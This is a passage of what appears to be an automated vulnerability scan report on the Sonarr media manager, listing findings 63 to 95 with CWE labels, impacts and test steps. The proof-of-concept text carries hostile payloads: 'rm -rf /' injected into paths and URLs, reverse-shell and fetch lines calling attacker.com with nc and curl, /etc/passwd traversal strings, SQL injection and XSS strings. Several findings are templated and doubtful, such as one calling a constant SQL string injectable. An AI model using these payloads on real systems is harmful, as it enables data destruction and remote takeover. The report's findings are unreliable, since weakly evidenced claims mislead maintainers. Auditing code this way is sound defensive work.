If an attacker can control the series path, they could set it to: "' OR 1=1; --". This would result in the SQL statement: "UPDATE \"EpisodeFiles\" SET \"RelativePath\" = REPLACE(\"Path\", ' OR 1=1; --', '') WHERE \"SeriesId\" = ?" which would update all episode files.

**How to Test:**
1. Set a series path to a malicious string like "' OR 1=1; --"
2. Run the migration
3. Verify if the SQL injection was successful

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_057_convert_episode_file_path_to_relativecs.py`
---

### 64. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/086_pushbullet_device_ids.cs
**Line:** 47

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of settings values without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the notification settings, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control the notification settings JSON, they could inject malicious SQL through the settings structure, potentially affecting the UPDATE statement execution.

**How to Test:**
1. Create a notification with malicious settings JSON
2. Run the migration
3. Verify if SQL injection occurred in the settings update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_086_pushbullet_device_idscs.py`
---

### 65. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/106_update_btn_url.cs
**Line:** 12

**Description:**
The migration code uses direct string replacement in SQL UPDATE statements without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses Execute.Sql with direct string replacement: Execute.Sql("UPDATE \"Indexers\" SET \"Settings\" = Replace(\"Settings\", 'api.btnapps.net', 'api.broadcasthe.net') WHERE \"Implementation\" = 'BroadcastheNet';");
```

**Impact:**
An attacker could inject malicious SQL commands through the indexer settings, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control indexer settings, they could inject SQL through the Replace function parameters, potentially affecting the entire database.

**How to Test:**
1. Set indexer settings to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the settings update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_106_update_btn_urlcs.py`
---

### 66. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/110_fix_extra_files_config.cs
**Line:** 38

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of configuration values without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the configuration values, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control the extra file extensions or import extra files configuration, they could inject SQL through the UPDATE statements.

**How to Test:**
1. Set configuration values to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the configuration update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_110_fix_extra_files_configcs.py`
---

### 67. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/166_update_series_sort_title.cs
**Line:** 27

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of sort title values without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the series sort title, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control the series title, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set a series title to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the sort title update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_166_update_series_sort_titlecs.py`
---

### 68. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/203_release_type.cs
**Line:** 32

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of release type values without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the release type, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control the original file path, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set an original file path to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the release type update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_203_release_typecs.py`
---

### 69. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/215_add_blurary576p_quality_in_profiles_with_grouped_blurary480p.cs
**Line:** 75

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of profile items without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the profile items, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control profile items, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set profile items to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the profile update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_215_add_blurary576p_quality_in_profiles_with_grouped_bl.py`
---

### 70. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/220_enable_season_pack_seeding_goal.cs
**Line:** 47

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of indexer settings without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the indexer settings, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control indexer settings, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set indexer settings to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the indexer update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_220_enable_season_pack_seeding_goalcs.py`
---

### 71. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/122_add_remux_qualities_in_profile.cs
**Line:** 75

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of profile items without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the profile items, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control profile items, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set profile items to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the profile update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_122_add_remux_qualities_in_profilecs.py`
---

### 72. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/157_email_multiple_addresses.cs
**Line:** 38

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of email settings without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the email settings, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control email settings, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set email settings to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the email settings update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_157_email_multiple_addressescs.py`
---

### 73. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/161_remove_plex_hometheater.cs
**Line:** 38

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of pending release data without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the pending release data, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control pending release data, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set pending release data to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the pending release update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_161_remove_plex_hometheatercs.py`
---

### 74. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/198_parse_titles_from_existing_subtitle_files.cs
**Line:** 42

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of subtitle file data without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the subtitle file data, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control subtitle file data, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set subtitle file data to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the subtitle file update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_198_parse_titles_from_existing_subtitle_filescs.py`
---

### 75. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/225_mediainfo_multiple_streams.cs
**Line:** 50

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of media info data without parameterization.
```

**Impact:**
An attacker could inject malicious SQL commands through the media info data, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control media info data, they could inject SQL through the UPDATE statement parameters.

**How to Test:**
1. Set media info data to include malicious SQL
2. Run the migration
3. Verify if SQL injection occurred in the media info update

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_225_mediainfo_multiple_streamscs.py`
---

### 76. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/FreeboxDownload/FreeboxDownloadProxy.cs
**Line:** 100

**Description:**
The AddTaskFromUrl method directly uses user-provided URL in URL encoding without proper validation, potentially allowing command injection through specially crafted URLs.

**Evidence:**
```
The method uses System.Web.HttpUtility.UrlPathEncode(url) which may not properly sanitize all URL components for command execution contexts.
```

**Impact:**
An attacker could inject commands through specially crafted URLs that get processed by the Freebox API, potentially leading to arbitrary command execution on the Freebox system.

**Proof of Concept:**
If the Freebox API endpoint accepts the URL parameter and processes it through shell commands, an attacker could craft a URL like "http://example.com/evil.png;rm -rf /" which might get executed on the Freebox system.

**How to Test:**
1. Configure a Freebox download client with a custom API URL
2. Try adding a torrent with a URL containing shell command injection characters
3. Monitor Freebox system logs for command execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_FreeboxDownload_FreeboxDownloadProxycs.py`
---

### 77. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Download/Clients/FreeboxDownload/FreeboxDownloadProxy.cs
**Line:** 124

**Description:**
The authentication process uses HMAC-SHA1 with a challenge but doesn't validate the challenge's origin or freshness, potentially allowing replay attacks.

**Evidence:**
```
The code retrieves challenge from API but doesn't validate its timestamp or origin before using it for password computation.
```

**Impact:**
An attacker could potentially replay old challenges to authenticate with the Freebox API, bypassing the time-sensitive nature of the challenge-response mechanism.

**Proof of Concept:**
An attacker captures a challenge from the Freebox API and waits for a period where the challenge is still valid but the session token has expired, then replays the challenge to obtain a new session token.

**How to Test:**
1. Capture a challenge from Freebox API
2. Wait for challenge to expire
3. Try to replay the old challenge to obtain a new session token
4. Verify if the replayed challenge is accepted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Download_Clients_FreeboxDownload_FreeboxDownloadProxycs.py`
---

### 78. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrentProxy.cs
**Line:** 105

**Description:**
The AddTorrentFromUrl method directly incorporates user-provided URL into XML-RPC request without proper sanitization, potentially allowing command injection.

**Evidence:**
```
The method calls ExecuteRequest(settings, "load.normal", args.ToArray()) where args contains the torrentUrl parameter directly without sanitization.
```

**Impact:**
An attacker could inject malicious commands into the rTorrent XML-RPC interface by crafting a specially formatted torrent URL, potentially leading to arbitrary command execution on the rTorrent server.

**Proof of Concept:**
If an attacker can control the torrent URL parameter, they could pass a URL like "http://example.com/torrent?param=;rm -rf /;" which could be executed by rTorrent when processing the torrent.

**How to Test:**
1. Set up a test rTorrent instance with the Sonarr configuration
2. Try to add a torrent with a URL containing special shell characters
3. Monitor if commands are executed on the rTorrent server

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentProxycs.py`
---

### 79. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrentProxy.cs
**Line:** 120

**Description:**
The AddTorrentFromFile method directly incorporates user-provided file content into XML-RPC request without proper sanitization, potentially allowing command injection.

**Evidence:**
```
The method calls ExecuteRequest(settings, "load.raw", args.ToArray()) where args contains fileContent parameter directly without sanitization.
```

**Impact:**
An attacker could inject malicious commands into the rTorrent XML-RPC interface by crafting specially formatted torrent files, potentially leading to arbitrary command execution on the rTorrent server.

**Proof of Concept:**
If an attacker can control the fileContent parameter, they could create a torrent file that when processed by rTorrent, executes shell commands through the XML-RPC interface.

**How to Test:**
1. Set up a test rTorrent instance with the Sonarr configuration
2. Try to add a torrent file with special characters in metadata
3. Monitor if commands are executed on the rTorrent server

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentProxycs.py`
---

### 80. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrent.cs
**Line:** 104

**Description:**
The code uses user-provided category names directly in system calls without proper sanitization, potentially allowing command injection attacks.

**Evidence:**
```
In the MarkItemAsImported method, Settings.TvImportedCategory is used directly in _proxy.SetTorrentLabel() call without validation or sanitization.
```

**Impact:**
An attacker could inject malicious commands through the category name configuration, potentially executing arbitrary code on the system running Sonarr.

**Proof of Concept:**
If an attacker configures TvImportedCategory to contain shell metacharacters like '; rm -rf /', and the underlying rTorrent proxy implementation executes this value in a shell context, it could lead to arbitrary command execution.

**How to Test:**
1. Configure a rTorrent client with TvImportedCategory containing shell metacharacters
2. Trigger the MarkItemAsImported method
3. Monitor system for unexpected command execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentcs.py`
---

### 81. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Download/Clients/Transmission/TransmissionProxy.cs
**Line:** 150

**Description:**
The Transmission proxy implementation has potential authentication issues where session IDs might not be properly validated or refreshed.

**Evidence:**
```
The authentication session ID caching mechanism in TransmissionProxy.cs might not properly handle session expiration or invalidation.
```

**Impact:**
An attacker could potentially reuse stale session IDs to perform unauthorized operations on the Transmission client.

**Proof of Concept:**
Obtain a valid session ID and try to use it after the Transmission client has invalidated it.

**How to Test:**
1. Obtain a session ID from Transmission
2. Wait for session timeout
3. Try to use the session ID for API calls
4. Verify if authentication still works

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Download_Clients_Transmission_TransmissionProxycs.py`
---

### 82. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/MediaFiles/ScriptImportDecider.cs
**Line:** 107

**Description:**
The script import functionality allows command injection through environment variables that are passed to external scripts without proper sanitization.

**Evidence:**
```
Environment variables including paths and file names are directly passed to external scripts without sanitization. The script path is read from configuration (_configService.ScriptImportPath) and environment variables are constructed from user-provided data.
```

**Impact:**
An attacker could inject malicious commands into the script execution by manipulating environment variables or script paths, potentially leading to arbitrary code execution on the server.

**Proof of Concept:**
If an attacker can control the ScriptImportPath configuration or manipulate environment variables, they could inject commands like: 'script.sh; rm -rf /' or 'script.sh && nc -e /bin/sh attacker.com 4444'.

**How to Test:**
1. Set up a custom script import path that accepts user input
2. Try injecting shell metacharacters into environment variables
3. Verify if commands execute with elevated privileges
4. Test with different script execution contexts

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_MediaFiles_ScriptImportDecidercs.py`
---

### 83. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/MediaFiles/ScriptImportDecider.cs
**Line:** 107

**Description:**
The script import functionality doesn't properly neutralize special elements in command arguments, leading to potential command injection vulnerabilities.

**Evidence:**
```
The script execution uses _processProvider.StartAndCapture with environment variables that include user-provided paths and file names without proper escaping or quoting.
```

**Impact:**
Command injection could allow attackers to execute arbitrary commands on the server with the privileges of the Sonarr process.

**Proof of Concept:**
Set up a script that accepts command line arguments and inject malicious commands through environment variables, such as passing '; rm -rf /' as part of a file path or series title.

**How to Test:**
1. Create a test script that echoes command line arguments
2. Configure Sonarr to use this script for import
3. Inject special shell characters into file paths or series names
4. Verify if commands are executed with the injected commands

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_MediaFiles_ScriptImportDecidercs.py`
---

### 84. Improper Control of Dynamically-Loaded Code (CWE-913)

**File:** src/NzbDrone.Core/MediaFiles/ScriptImportDecider.cs
**Line:** 107

**Description:**
The script import functionality dynamically loads and executes external scripts without proper validation of script integrity or execution context.

**Evidence:**
```
The code directly executes external scripts from _configService.ScriptImportPath without validating script content, permissions, or execution context.
```

**Impact:**
An attacker could replace or modify the script file to execute malicious code, potentially leading to full system compromise.

**Proof of Concept:**
Replace the configured script import path with a malicious script that executes arbitrary commands or exfiltrates data, then trigger an import operation.

**How to Test:**
1. Replace the configured script import path with a malicious script
2. Trigger an import operation
3. Verify if the malicious script executes
4. Check if the script can access system resources or exfiltrate data

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-913_src_NzbDroneCore_MediaFiles_ScriptImportDecidercs.py`
---

### 85. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/MediaFiles/MediaFileDeletionService.cs
**Line:** 35

**Description:**
The code constructs file paths using user-provided data without proper validation, potentially allowing path traversal attacks. The fullPath is constructed using Path.Combine(series.Path, episodeFile.RelativePath) which could be manipulated to access files outside the intended directory.

**Evidence:**
```
The fullPath is constructed using Path.Combine(series.Path, episodeFile.RelativePath) without validating that the relative path doesn't contain '..' sequences that could traverse outside the series directory.
```

**Impact:**
An attacker could delete arbitrary files on the system by manipulating the episodeFile.RelativePath to include path traversal sequences, potentially leading to privilege escalation or data loss.

**Proof of Concept:**
If episodeFile.RelativePath contains '../etc/passwd', the fullPath would become '/series/path/../etc/passwd' which resolves to '/etc/passwd', allowing deletion of system files.

**How to Test:**
1. Create a series with a specific path
2. Create an episode file with RelativePath containing '..' sequences
3. Call DeleteEpisodeFile with this manipulated episode file
4. Verify if files outside the series directory are deleted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_MediaFiles_MediaFileDeletionServicecs.py`
---

### 86. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 104

**Description:**
The GetMediaFiles method accepts a path parameter that is not properly validated against directory traversal attacks. The path parameter is used directly in file operations without proper sanitization.

**Evidence:**
```
The method accepts a 'path' parameter and uses it directly in _diskProvider.FolderExists(path) and _diskProvider.FileExists(path) without validation.
```

**Impact:**
An attacker could potentially access files outside of the intended directory by providing a path with directory traversal sequences like '../' or '..\'. This could lead to information disclosure or arbitrary file access.

**Proof of Concept:**
An attacker could call GetMediaFiles with path = '../../../../etc/passwd' which would be passed directly to _diskProvider.FileExists() without validation, potentially allowing access to system files.

**How to Test:**
Call GetMediaFiles with various path traversal sequences like '../', '../../', '...\', etc. and verify if the system allows access to files outside intended directories.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 87. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 152

**Description:**
The ReprocessItem method constructs paths using user-provided input without proper sanitization, potentially leading to command injection vulnerabilities when these paths are used in system calls.

**Evidence:**
```
The method uses path parameter directly in Path.GetDirectoryName(path) and other path operations without validating or sanitizing the input path.
```

**Impact:**
If the path parameter contains shell metacharacters, it could lead to command injection when the system executes commands using these paths.

**Proof of Concept:**
If a path parameter contains shell metacharacters like '; rm -rf /' or '| curl http://attacker.com/evil.sh', and this path is used in system commands, it could execute arbitrary commands.

**How to Test:**
Test ReprocessItem with path parameters containing shell metacharacters and verify if they are properly sanitized before being used in system calls.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 88. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Messaging/Commands/CommandExecutor.cs
**Line:** 43

**Description:**
The command execution logic uses dynamic casting and command bodies that could be vulnerable to command injection if command bodies contain untrusted input that gets executed as system commands.

**Evidence:**
```
The ExecuteCommand method uses dynamic casting of command.Body and executes handlers without proper input validation or sanitization of command parameters that might contain shell commands.
```

**Impact:**
An attacker could potentially inject malicious commands through command parameters, leading to arbitrary code execution on the server.

**Proof of Concept:**
If a command body contains user-controllable input that gets executed as a system command, an attacker could inject shell commands through the command execution pipeline.

**How to Test:**
1. Create a command with malicious input in the command body
2. Monitor command execution logs
3. Check if command parameters are properly sanitized before execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Messaging_Commands_CommandExecutorcs.py`
---

### 89. Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (CWE-707)

**File:** src/NzbDrone.Core/Notifications/NotificationService.cs
**Line:** 107

**Description:**
The GetMessage method constructs messages that are used in notifications without proper HTML escaping, potentially leading to XSS vulnerabilities when these messages are displayed in web interfaces.

**Evidence:**
```
The GetMessage method constructs messages using string concatenation without HTML escaping, and these messages are passed to notification handlers that may render them in web contexts.
```

**Impact:**
An attacker could inject malicious JavaScript into notification messages that would execute in the context of users viewing the notifications, potentially leading to session hijacking or data exfiltration.

**Proof of Concept:**
If a notification message contains '<script>alert(1)</script>' and is rendered in a web interface, the script would execute when users view the notification.

**How to Test:**
1. Create a notification with HTML content including script tags
2. Check if the HTML is properly escaped when displayed in web interfaces
3. Verify that XSS payloads in notification messages execute in browser context

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Notifications_NotificationServicecs.py`
---

### 90. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Notifications/Synology/SynologyIndexerProxy.cs
**Line:** 58

**Description:**
The SynologyIndexerProxy class executes shell commands using user-provided file paths without proper sanitization, creating potential command injection vulnerabilities.

**Evidence:**
```
The ExecuteCommand method calls _processProvider.StartAndCapture with arguments that include user-provided file paths without proper escaping or validation.
```

**Impact:**
An attacker could inject shell commands through file paths, potentially leading to arbitrary code execution on the Synology device.

**Proof of Concept:**
If a file path contains shell metacharacters like '; rm -rf /' or '| nc attacker.com 4444', these commands could be executed during file operations.

**How to Test:**
1. Create a file with a path containing shell metacharacters
2. Trigger a notification that processes this file through Synology indexer
3. Verify if shell commands are executed during the process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Notifications_Synology_SynologyIndexerProxycs.py`
---

### 91. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/Notifications/Synology/SynologyIndexerProxy.cs
**Line:** 58

**Description:**
The SynologyIndexerProxy class is vulnerable to path traversal attacks when processing file paths through shell commands.

**Evidence:**
```
The ExecuteCommand method uses user-provided file paths directly in shell commands without path validation or sanitization.
```

**Impact:**
An attacker could perform path traversal attacks to access or modify files outside the intended directory scope.

**Proof of Concept:**
A file path like '../../../../etc/passwd' could be used to read system files or create files in unintended locations.

**How to Test:**
1. Configure a notification with file paths containing path traversal sequences
2. Trigger notification processing
3. Verify if path traversal is successful and if unintended files are accessed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Notifications_Synology_SynologyIndexerProxycs.py`
---

### 92. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
The Discord notification system directly incorporates user-provided data into Discord embed fields without proper sanitization, potentially allowing XSS attacks when the Discord webhook payload is rendered in the Discord client.

**Evidence:**
```
The code populates Discord embed fields with data from various sources including episode overviews, release titles, and other user-provided content without sanitizing special characters that could be interpreted as HTML/JavaScript in Discord's rendering.
```

**Impact:**
An attacker could craft a release with malicious content in fields like 'Overview', 'Release', or 'Title' that when sent to Discord could execute JavaScript in the Discord client, potentially leading to credential theft or further exploitation.

**Proof of Concept:**
An attacker could create a release with an overview field containing: "<img src=x onerror=alert('XSS')>" or "```<script>alert('XSS')</script>```" which would be rendered in Discord and potentially execute JavaScript.

**How to Test:**
1. Configure a Discord notification with custom fields that include user-controllable data
2. Create a release with malicious content in fields like Overview or Release
3. Trigger the notification and observe if the malicious content executes in Discord

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 93. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Notifications/Trakt/TraktProxy.cs
**Line:** 18

**Description:**
The Trakt ClientId is hardcoded in the source code, making it visible to anyone with access to the source code or binary.

**Evidence:**
```
The ClientId is hardcoded as a constant string: 'd44ba57cab40c31eb3f797dcfccd203500796539125b333883ec1d94aa62ed4c'
```

**Impact:**
If the client ID is compromised, attackers can potentially make unauthorized API calls to Trakt, access user data, or perform actions on behalf of users.

**Proof of Concept:**
An attacker with access to the source code can easily extract the Trakt ClientId. This client ID can then be used to make API calls to Trakt without user authentication, potentially accessing user collections or settings.

**How to Test:**
1. Extract the source code or binary
2. Search for the ClientId constant
3. Verify that it's hardcoded and not retrieved from environment variables or configuration files

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Notifications_Trakt_TraktProxycs.py`
---

### 94. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Notifications/CustomScript/CustomScript.cs
**Line:** 300

**Description:**
The CustomScript notification handler directly uses user-provided environment variables without proper sanitization, potentially allowing command injection when scripts execute.

**Evidence:**
```
Environment variables are set directly from message data without sanitization: environmentVariables.Add("Sonarr_EventType", "Grab"); environmentVariables.Add("Sonarr_Series_Title", series.Title);
```

**Impact:**
If a custom script is executed and the script is not properly secured, an attacker could inject commands through specially crafted series titles or other message data that gets passed to the script.

**Proof of Concept:**
If a series title contains shell metacharacters like '; rm -rf /' and the custom script doesn't properly quote or escape environment variables, the script could execute arbitrary commands.

**How to Test:**
1. Configure a custom script notification
2. Create a series with a title containing shell metacharacters
3. Trigger a notification event
4. Check if the script properly handles special characters in environment variables

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Notifications_CustomScript_CustomScriptcs.py`
---

### 95. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core/Notifications/Telegram/TelegramProxy.cs
**Line:** 55

**Description:**
